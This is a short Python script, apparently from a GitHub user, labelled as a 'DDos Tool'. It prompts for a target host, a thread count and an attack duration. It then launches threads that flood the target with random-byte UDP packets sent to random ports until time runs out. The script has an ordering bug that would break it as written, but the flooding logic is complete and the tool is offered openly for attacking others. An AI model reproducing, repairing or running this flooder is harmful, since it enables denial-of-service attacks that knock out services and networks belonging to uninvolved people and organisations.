import socket
import random
import threading
import sys
import time
import os

from os import system

system("mode 50,10")
system("title DDos Tool @hvrl")
running = True

def start():
    print("GitHub @hvrrl")
    print('')
    global TARGET
    global THREADS
    global TIME
    try:
        TARGET = str(input("ENTER YOUR TARGET: "))
        THREADS = int(input("ENTER THREADS: "))
        TIME = float(input("ENTER ATTACK DURATION: "))
    except:
        print("Invalid Input")
    system("cls")
    
timeout = time.time() + 1*TIME

def attack():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15), (TARGET, dport))
        return
        sys.exit()
    except:
        pass
    
def main():
    while running:
        start()
        for x in range(0, THREADS):
            threading.Thread(target=attack).start()
            
        time.sleep(TIME)
        print("ATTACK DONE")
        time.sleep(1)
        system("cls")

if __name__ == '__main__':
    main()
